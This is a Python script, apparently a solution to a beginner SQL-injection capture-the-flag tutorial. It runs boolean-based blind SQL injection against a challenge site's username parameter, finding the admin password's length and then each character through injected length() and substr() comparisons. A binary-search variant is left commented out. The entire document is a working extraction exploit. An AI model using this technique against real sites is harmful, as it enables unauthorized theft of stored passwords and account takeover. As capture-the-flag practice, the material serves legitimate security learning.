import requests

def main():
    url = "http://challenge.beginner-sqli.m1z0r3.ctf.ryotosaito.com/tutorial8/index.php?username="
    flag = ""

    # Length prediction
    length = 1
    print()
    while True:
        # Hint: You want to know the length of the password
        query = "admin' and length(password) = " + str(length) + " -- "
        print("\033[A" + str(length))
        if "already" in requests.get(url+query).text:
            # If query returnes true
            break
        length += 1

    print("Length of password is " + str(length) + "!!")

    # Password prediction
    chars = "!\\\"#$%&()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[]_abcdefghijklmnopqrstuvwxyz{}"

    for flag_index in range(length):
        chars_index = 0
        left = 0
        right = len(chars)
        print()
        while True:
            # linear search
            # Hint: You want to know if chars[char_index] is correctly 'flag_index'th char of password
            query = "admin' and substr(password," + str(flag_index + 1) + ",1) = '" + chars[chars_index] + "' -- "
            print("\033[A" + str(chars[chars_index]))
            if "already" in requests.get(url+query).text:
                # If query returnes true
                flag += chars[chars_index]
                break
            else:
                chars_index += 1
            """
            # binary search
            query = "admin' and substr(password," + str(flag_index + 1) + ",1) > '"
            chars_index = int((left + right) / 2)
            query += chars[chars_index]
            query += "' -- "
            print("\033[A" + chars[chars_index])
            if "already" in requests.get(url+query).text:
                left = chars_index + 1
            else:
                right = chars_index - 1
            if left > right:
                flag += chars[left]
                break
            """
        print(flag)

if __name__ == '__main__':
    main()
